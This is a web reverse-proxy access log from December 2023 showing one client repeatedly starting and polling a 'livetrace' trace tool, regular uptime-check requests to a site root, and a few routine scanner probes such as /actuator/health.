173.48.140.140 - - [14/Dec/2023:05:52:06 +0000] "GET /trace/start.php?id=rrufvmat0 HTTP/2.0" 200 104 "-" "-" 883 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:52:19 +0000] "GET /trace/index.php HTTP/2.0" 200 752 "-" "-" 884 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:52:20 +0000] "GET /trace/start.php?id=5c1b1cb5a HTTP/2.0" 200 104 "-" "-" 885 "livetrace@docker" "http://172.25.0.5:80" 3ms
159.203.109.206 - - [14/Dec/2023:05:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 886 "www@docker" "http://172.25.0.8:80" 0ms
34.78.6.216 - - [14/Dec/2023:05:52:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 887 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:05:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 888 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:53:17 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 889 "www@docker" "http://172.25.0.8:80" 28ms
173.48.140.140 - - [14/Dec/2023:05:53:22 +0000] "GET /ip/ HTTP/2.0" 404 555 "-" "-" 890 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 891 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:53:27 +0000] "GET /trace/ HTTP/2.0" 200 752 "-" "-" 892 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:53:27 +0000] "GET /trace/styles.css HTTP/2.0" 200 629 "-" "-" 894 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:53:27 +0000] "GET /trace/script.js HTTP/2.0" 200 1174 "-" "-" 893 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:27 +0000] "GET /trace/start.php?id=nhufujt17 HTTP/2.0" 200 104 "-" "-" 895 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:53:28 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 233 "-" "-" 896 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:29 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 307 "-" "-" 897 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:30 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 382 "-" "-" 898 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:31 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 456 "-" "-" 899 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:32 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 530 "-" "-" 900 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:33 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 604 "-" "-" 901 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:34 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 678 "-" "-" 902 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:53:35 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 753 "-" "-" 903 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:53:36 +0000] "GET /trace/poll.php?id=nhufujt17 HTTP/2.0" 200 1053 "-" "-" 904 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [14/Dec/2023:05:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 905 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 906 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 907 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 908 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 909 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 910 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 911 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 912 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 913 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 914 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 915 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 916 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 917 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 918 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 919 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 920 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 921 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 922 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 923 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 924 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 925 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 926 "www@docker" "http://172.25.0.8:80" 24ms
173.48.140.140 - - [14/Dec/2023:06:04:26 +0000] "GET /trace/ HTTP/2.0" 200 783 "-" "-" 927 "livetrace@docker" "http://172.25.0.5:80" 18ms
173.48.140.140 - - [14/Dec/2023:06:04:26 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 928 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:04:26 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 929 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:06:04:26 +0000] "GET /trace/start.php?id=rczop1yrp HTTP/2.0" 200 104 "-" "-" 930 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:06:04:27 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 234 "-" "-" 931 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:04:28 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 309 "-" "-" 932 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:04:29 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 383 "-" "-" 933 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:04:30 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 457 "-" "-" 934 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:04:31 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 531 "-" "-" 935 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:04:32 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 606 "-" "-" 936 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:04:33 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 681 "-" "-" 937 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:04:34 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 755 "-" "-" 938 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:04:35 +0000] "GET /trace/poll.php?id=rczop1yrp HTTP/2.0" 200 1055 "-" "-" 939 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 940 "www@docker" "http://172.25.0.8:80" 12ms
192.241.204.48 - - [14/Dec/2023:06:05:04 +0000] "GET /actuator/health HTTP/1.1" 301 17 "-" "-" 941 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 942 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 943 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:06:05:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 944 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 945 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 946 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 947 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 948 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 949 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 950 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 951 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 952 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 953 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 954 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 955 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 956 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 957 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 958 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 959 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 960 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 961 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 962 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 963 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 964 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 965 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 966 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 967 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 968 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 969 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 970 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 971 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 972 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:06:20:01 +0000] "GET /trace/ HTTP/2.0" 200 783 "-" "-" 973 "livetrace@docker" "http://172.25.0.5:80" 6ms
173.48.140.140 - - [14/Dec/2023:06:20:01 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 974 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:01 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 975 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:01 +0000] "GET /trace/start.php?id=i7dcphq6h HTTP/2.0" 200 104 "-" "-" 976 "livetrace@docker" "http://172.25.0.5:80" 4ms
173.48.140.140 - - [14/Dec/2023:06:20:02 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 235 "-" "-" 977 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:20:03 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 309 "-" "-" 978 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:04 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 383 "-" "-" 979 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:05 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 457 "-" "-" 980 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:06 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 531 "-" "-" 981 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:07 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 605 "-" "-" 982 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:08 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 679 "-" "-" 983 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:20:09 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 753 "-" "-" 984 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:20:10 +0000] "GET /trace/poll.php?id=i7dcphq6h HTTP/2.0" 200 1053 "-" "-" 985 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:06:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 986 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 987 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 988 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 989 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 990 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 991 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 992 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 993 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 994 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 995 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 996 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 997 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 998 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 999 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1000 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1001 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1002 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1003 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1004 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1005 "www@docker" "http://172.25.0.8:80" 0ms
8.209.68.21 - - [14/Dec/2023:06:30:11 +0000] "GET /dns-query?dns=19wBAAABAAAAAAAABmdvb2dsZQNjb20AAAEAAQ HTTP/2.0" 404 19 "-" "-" 1006 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1007 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1008 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1009 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1010 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1011 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1012 "www@docker" "http://172.25.0.8:80" 0ms
35.203.211.73 - - [14/Dec/2023:06:33:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1013 "web-to-websecure@internal" "-" 0ms
35.203.211.73 - - [14/Dec/2023:06:33:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1014 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1015 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1016 "www@docker" "http://172.25.0.8:80" 0ms
68.69.186.30 - - [14/Dec/2023:06:34:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1017 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1018 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1019 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1020 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1021 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:18 +0000] "GET /trace/ HTTP/2.0" 200 783 "-" "-" 1022 "livetrace@docker" "http://172.25.0.5:80" 5ms
173.48.140.140 - - [14/Dec/2023:06:36:18 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 1023 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:06:36:18 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 1024 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:06:36:18 +0000] "GET /trace/start.php?id=tfrmzbzkv HTTP/2.0" 200 104 "-" "-" 1025 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:06:36:19 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 234 "-" "-" 1026 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:20 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 308 "-" "-" 1027 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:21 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 382 "-" "-" 1028 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:06:36:22 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 456 "-" "-" 1029 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:23 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 531 "-" "-" 1030 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:24 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 606 "-" "-" 1031 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1032 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:25 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 680 "-" "-" 1033 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:26 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 754 "-" "-" 1034 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:06:36:27 +0000] "GET /trace/poll.php?id=tfrmzbzkv HTTP/2.0" 200 1054 "-" "-" 1035 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1036 "www@docker" "http://172.25.0.8:80" 0ms
35.190.199.12 - - [14/Dec/2023:06:36:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1037 "-" "-" 0ms
5.196.69.140 - - [14/Dec/2023:06:36:53 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 1038 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1039 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1040 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1041 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1042 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1043 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1044 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1045 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1046 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1047 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1048 "www@docker" "http://172.25.0.8:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:19 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 1049 "livetrace@docker" "http://172.25.0.5:80" 5039ms
65.153.45.109 - - [14/Dec/2023:06:42:24 +0000] "GET /trace/styles.css HTTP/2.0" 200 629 "-" "-" 1051 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:24 +0000] "GET /trace/script.js HTTP/2.0" 200 1174 "-" "-" 1050 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:24 +0000] "GET /trace/start.php?id=ky8vq64qr HTTP/2.0" 200 103 "-" "-" 1052 "livetrace@docker" "http://172.25.0.5:80" 3ms
159.203.109.206 - - [14/Dec/2023:06:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1053 "www@docker" "http://172.25.0.8:80" 1ms
